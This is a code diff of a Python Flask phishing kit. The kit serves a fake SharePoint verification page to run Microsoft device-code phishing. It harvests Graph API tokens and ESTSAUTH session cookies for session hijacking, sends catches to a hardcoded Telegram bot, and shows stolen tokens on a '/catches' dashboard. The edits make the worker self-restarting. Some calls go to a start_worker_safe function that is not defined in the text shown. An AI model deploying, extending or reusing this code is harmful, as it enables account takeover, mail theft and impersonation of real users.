@@ -7,7 +7,6 @@ import random
 import re
 import sqlite3
 import threading
-import signal
 import requests
 from flask import Flask, request, Response
 
@@ -19,7 +18,6 @@ TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
-# Client IDs pre-authorized for Graph Device Code Flow (ONLY these work)
 CLIENT_IDS = [
     "14d82eec-204b-4c2f-b7e8-296a70dab67e",  # Microsoft Graph Command Line Tools
     "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
@@ -27,7 +25,6 @@ CLIENT_IDS = [
 ]
 CLIENT_ID_INDEX = 0
 
-# Scopes targeting Graph API (Mail, Calendar, Contacts, User Profile)
 DEVICE_CODE_SCOPE = (
     "https://graph.microsoft.com/Mail.ReadWrite "
     "https://graph.microsoft.com/Mail.Send "
@@ -38,30 +35,27 @@ DEVICE_CODE_SCOPE = (
     "offline_access openid profile"
 )
 
-# Cookies we want to harvest for persistent session hijacking
 COOKIE_WANTED = [
     "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
     "SignInStateCookie", "x-ms-gateway-suitename", "ESTSAUTHHPERSISTENT",
     "brcap", "fpc", "esctx", "cltm", "x-ms-cpim-sso",
 ]
 
-# ---------------------------------------
-# PROXY LIST (fill in your own proxies)
-# Format: "http://user:pass@host:port"  or  "http://host:port" (IP whitelist)
-# ---------------------------------------
-PROXY_LIST = [
-    # "socks5h://1uwcyc5f57z:24q5qgmas3j@89.105.210.197:1080",
-    # "http://user:pass@proxy2.example.com:8080",
-]
+PROXY_LIST = []
 
 app = Flask(__name__)
-shutdown_event = threading.Event()
 
 # ---------------------------------------
 # DATABASE MANAGEMENT
 # ---------------------------------------
+def db_connect():
+    # timeout=30 stops "database is locked" crashes between threads
+    con = sqlite3.connect(DB_PATH, timeout=30)
+    con.execute("PRAGMA journal_mode=WAL")
+    return con
+
 def init_db():
-    con = sqlite3.connect(DB_PATH)
+    con = db_connect()
     con.execute("""CREATE TABLE IF NOT EXISTS sessions (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         device_code TEXT,
@@ -84,7 +78,7 @@ def init_db():
 init_db()
 
 def db_add_session(device_code, user_code, client_id, interval, expires_at):
-    con = sqlite3.connect(DB_PATH)
+    con = db_connect()
     con.execute(
         "INSERT INTO sessions (device_code, user_code, client_id, interval, expires_at, status, ts) VALUES (?,?,?,?,?,?,?)",
         (device_code, user_code, client_id, interval, expires_at, "pending",
@@ -96,7 +90,7 @@ def db_add_session(device_code, user_code, client_id, interval, expires_at):
     return sid
 
 def db_pending_sessions():
-    con = sqlite3.connect(DB_PATH)
+    con = db_connect()
     rows = con.execute(
         "SELECT id, device_code, client_id, interval, expires_at FROM sessions WHERE status='pending'"
     ).fetchall()
@@ -104,7 +98,7 @@ def db_pending_sessions():
     return rows
 
 def db_update_session(sid, **kw):
-    con = sqlite3.connect(DB_PATH)
+    con = db_connect()
     for k, v in kw.items():
         con.execute(f"UPDATE sessions SET {k}=? WHERE id=?", (v, sid))
     con.commit()
@@ -163,9 +157,8 @@ def request_device_code():
             data = resp.json()
             if resp.status_code == 200 and "device_code" in data:
                 return client_id, data
-            else:
-                print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
-                CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
+            print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
+            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
         except Exception as e:
             print(f"[SESSION] client_id {client_id} exception: {e}")
             CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
@@ -181,29 +174,18 @@ def decode_id_token(id_token):
         return "unknown"
 
 # ---------------------------------------
-# COOKIE MINTING (SSO Round-Trip) — WITH PROXY
+# COOKIE MINTING (SSO Round-Trip)
 # ---------------------------------------
 def get_victim_cookies(refresh_token, client_id, email):
-    """
-    Refreshes the token and performs a completed SSO authorize round-trip
-    to mint ESTSAUTH / ESTSAUTHPERSISTENT session cookies. Routes all
-    traffic through a random proxy from PROXY_LIST if available.
-    """
     try:
         s = requests.Session()
-
-        # Pick a proxy (round-robin random) if any are configured
-        if PROXY_LIST:
-            proxy = random.choice(PROXY_LIST)
+        proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
+        if proxy:
             s.proxies = {"http": proxy, "https": proxy}
-            host = proxy.split("@")[1] if "@" in proxy else proxy
-            print(f"[COOKIES] using proxy: {host}")
-
         s.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
         })
 
-        # Step 1: Refresh the token (through proxy)
         r = s.post(
             f"{UPSTREAM}/common/oauth2/v2.0/token",
             data={
@@ -219,7 +201,6 @@ def get_victim_cookies(refresh_token, client_id, email):
             print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
             return None
 
-        # Step 2: SSO Authorize with prompt=none so it auto-completes silently
         nonce = uuid.uuid4().hex
         auth_url = (
             f"{UPSTREAM}/common/oauth2/authorize?"
@@ -230,8 +211,6 @@ def get_victim_cookies(refresh_token, client_id, email):
         )
         resp = s.get(auth_url, timeout=25, allow_redirects=True)
 
-        # Step 3: Follow chained form_post redirects manually.
-        # Microsoft returns HTML pages with auto-submitting <form> tags.
         for _ in range(8):
             m = re.search(
                 r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>',
@@ -251,20 +230,16 @@ def get_victim_cookies(refresh_token, client_id, email):
                 break
             resp = s.post(action, data=fields, timeout=25, allow_redirects=True)
 
-        # Step 4: Hit the root login page once more to sweep up
-        # any remaining session cookies (ESTSAUTHLIGHT, cltm, etc.)
         try:
             s.get(f"{UPSTREAM}/", timeout=20)
         except Exception:
             pass
 
-        # Step 5: Collect the wanted cookies
         cookies = {}
         for c in s.cookies:
             if c.name in COOKIE_WANTED and c.value:
                 cookies[c.name] = c.value
 
-        # Must have at least one ESTSAUTH* cookie for a usable hijack session
         auth_cookies = [k for k in cookies if k.startswith("ESTSAUTH")]
         if not auth_cookies:
             print("[COOKIES] no ESTSAUTH cookies captured - got:", list(cookies.keys()))
@@ -297,15 +272,15 @@ def format_cookie_editor_json(cookies):
     return json.dumps(out, indent=2)
 
 # ---------------------------------------
-# POLLING WORKER
+# POLLING WORKER (self-restarting)
 # ---------------------------------------
 def poll_worker():
     print("[WORKER] poll_worker started")
-    while not shutdown_event.is_set():
+    while True:
         try:
             sessions = db_pending_sessions()
             if not sessions:
-                shutdown_event.wait(timeout=5)
+                time.sleep(5)
                 continue
 
             for sid, device_code, client_id, interval, expires_at in sessions:
@@ -337,7 +312,6 @@ def poll_worker():
                         "id_token": data.get("id_token"),
                     }
 
-                    # Attempt to mint cookies (through proxy)
                     cookies = get_victim_cookies(tokens["refresh_token"], client_id, email)
 
                     db_update_session(
@@ -386,29 +360,28 @@ def poll_worker():
                     db_update_session(sid, status="declined")
                     print(f"[WORKER] session {sid} declined")
 
-                shutdown_event.wait(timeout=interval)
+                time.sleep(interval)
 
         except Exception as e:
             print(f"[WORKER] loop error: {e}")
-            shutdown_event.wait(timeout=5)
+            time.sleep(5)
 
-    print("[WORKER] poll_worker stopped")
+def worker_supervisor():
+    """Restarts the poll worker automatically if it ever dies."""
+    while True:
+        try:
+            poll_worker()
+        except Exception as e:
+            print(f"[WORKER] worker crashed, restarting: {e}")
+        time.sleep(3)
 
 _worker_started = False
 def start_worker():
     global _worker_started
     if not _worker_started:
-        threading.Thread(target=poll_worker, daemon=True).start()
+        threading.Thread(target=worker_supervisor, daemon=True).start()
         _worker_started = True
-        print("[WORKER] thread launched")
-
-start_worker()
-
-def _shutdown(sig, frame):
-    shutdown_event.set()
-
-signal.signal(signal.SIGTERM, _shutdown)
-signal.signal(signal.SIGINT, _shutdown)
+        print("[WORKER] supervisor launched")
 
 # ---------------------------------------
 # PHISHING PAGE (SharePoint Theme)
@@ -422,13 +395,12 @@ def render_page(user_code, verify_url):
 <title>SharePoint - Verify Identity</title>
 <style>
 * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-body {{ font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif; background-color: #faf9f8; color: #201f1e; min-height: 100vh; line-height: 1.5; overflow-x: hidden; }}
+body {{ font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif; background-color: #faf9f8; color: #201f1e; min-height: 100vh; line-height: 1.5; overflow-x: hidden; }}
 .sp-header {{ background: linear-gradient(90deg, #0078d4 0%, #106ebe 100%); height: 48px; display: flex; align-items: center; padding: 0 24px; box-shadow: 0 2px 4px rgba(0,0,0,0.12); position: relative; z-index: 100; }}
 .sp-logo {{ width: 32px; height: 32px; background: white; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 18px; color: #0078d4; margin-right: 12px; }}
 .sp-title {{ color: white; font-size: 16px; font-weight: 600; letter-spacing: 0.2px; }}
 .breadcrumb {{ background: white; padding: 12px 32px; border-bottom: 1px solid #edebe9; font-size: 14px; display: flex; align-items: center; gap: 8px; }}
 .breadcrumb a {{ color: #0078d4; text-decoration: none; }}
-.breadcrumb a:hover {{ text-decoration: underline; color: #106ebe; }}
 .breadcrumb .sep {{ color: #a19f9d; margin: 0 2px; }}
 .breadcrumb .current {{ color: #201f1e; font-weight: 600; }}
 .main-container {{ max-width: 1100px; margin: 30px auto; padding: 0 20px; }}
@@ -476,7 +448,6 @@ body {{ font-family: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, 
 .action-btn svg {{ width: 18px; height: 18px; fill: white; }}
 .footer {{ text-align: center; padding: 24px; font-size: 12px; color: #a19f9d; }}
 .footer a {{ color: #0078d4; text-decoration: none; }}
-.footer a:hover {{ text-decoration: underline; }}
 @media (max-width: 640px) {{ .main-container {{ margin: 20px auto; padding: 0 12px; }} .verify-overlay {{ padding: 32px 24px; }} .verify-title {{ font-size: 22px; }} .code-text {{ font-size: 28px; letter-spacing: 2px; }} .breadcrumb {{ padding: 10px 16px; font-size: 13px; }} }}
 </style>
 </head>
@@ -546,23 +517,32 @@ function go() {{
 # ---------------------------------------
 @app.route("/", methods=["GET"])
 def home():
+    start_worker_safe()  # ensure worker is alive on every request
+
     client_id, data = request_device_code()
     if not data:
         return "<h2>Service temporarily unavailable, please retry.</h2>", 503
+
     sid = db_add_session(
         data["device_code"], data["user_code"], client_id,
         data.get("interval", 5), time.time() + int(data.get("expires_in", 900))
     )
     print(f"[SESSION] new session {sid} user_code={data['user_code']}")
-    return Response(render_page(data["user_code"], data["verification_uri"]), mimetype="text/html")
+
+    return Response(render_page(data["user_code"], data["verification_uri"]),
+                    mimetype="text/html")
+
 
 @app.route("/test_tg", methods=["GET"])
 def test_tg():
+    start_worker_safe()
     send_telegram("✅ Test message from your phishing app - Telegram works!")
     return "Telegram test sent - check your DMs."
 
+
 @app.route("/catches", methods=["GET"])
 def catches():
+    start_worker_safe()
     con = sqlite3.connect(DB_PATH)
     rows = con.execute(
         "SELECT id, email, tokens, cookies, ts FROM sessions WHERE status='caught' ORDER BY id DESC LIMIT 20"
@@ -572,31 +552,46 @@ def catches():
     html = """<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Catches</title>
 <style>
-body { font-family: 'Segoe UI', sans-serif; background: #faf9f8; padding: 30px; }
-.card { background: white; border: 1px solid #e1dfdd; border-radius: 8px; padding: 24px; max-width: 900px; margin: auto; }
-h1 { font-size: 20px; color: #323130; }
-.catch { border-bottom: 1px solid #edebe9; padding: 14px 0; }
-.catch b { color: #0078d4; }
-pre { background: #faf9f8; border: 1px solid #edebe9; padding: 10px; overflow-x: auto; font-size: 12px; white-space: pre-wrap; word-break: break-all; }
-</style></head><body><div class="card">
-<h1>Recent Catches</h1>"""
+body { font-family: 'Segoe UI', sans-serif; background: #faf9f8; padding: 24px; }
+h1 { color: #0078d4; }
+.card { background: white; border: 1px solid #e1dfdd; border-radius: 8px; padding: 16px; margin-bottom: 16px; box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13); }
+.email { font-weight: 700; color: #005a9e; font-size: 16px; }
+.ts { color: #a19f9d; font-size: 12px; }
+pre { background: #f3f2f1; padding: 10px; border-radius: 4px; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+details { margin: 6px 0; }
+summary { cursor: pointer; font-weight: 600; color: #323130; }
+</style></head><body>
+<h1>Caught Sessions (last 20)</h1>"""
+
+    if not rows:
+        html += "<p>No catches yet.</p>"
 
     for sid, email, tokens, cookies, ts in rows:
-        html += f"<div class='catch'><b>#{sid}</b> {email} — {ts}<br>"
-        html += f"<pre>{tokens}</pre>"
-        if cookies and cookies != "{}":
-            html += f"<pre>{cookies}</pre>"
+        html += f'<div class="card"><div class="email">#{sid} — {email}</div>'
+        html += f'<div class="ts">{ts}</div>'
+        try:
+            t = json.loads(tokens or "{}")
+            html += '<details><summary>Access Token</summary><pre>'
+            html += (t.get("access_token") or "none") + '</pre></details>'
+            html += '<details><summary>Refresh Token</summary><pre>'
+            html += (t.get("refresh_token") or "none") + '</pre></details>'
+            html += '<details><summary>ID Token</summary><pre>'
+            html += (t.get("id_token") or "none") + '</pre></details>'
+        except Exception:
+            html += "<p>Token parse error</p>"
+        try:
+            c = json.loads(cookies or "{}")
+            if c:
+                cookie_str = "; ".join(f"{k}={v}" for k, v in c.items())
+                html += f'<details><summary>Cookies ({len(c)})</summary><pre>{cookie_str}</pre></details>'
+        except Exception:
+            pass
         html += "</div>"
 
-    html += "</div></body></html>"
+    html += "</body></html>"
     return Response(html, mimetype="text/html")
 
 
-@app.route("/health", methods=["GET"])
-def health():
-    return "OK", 200
-
-
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, threaded=True)
+    start_worker_safe()
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
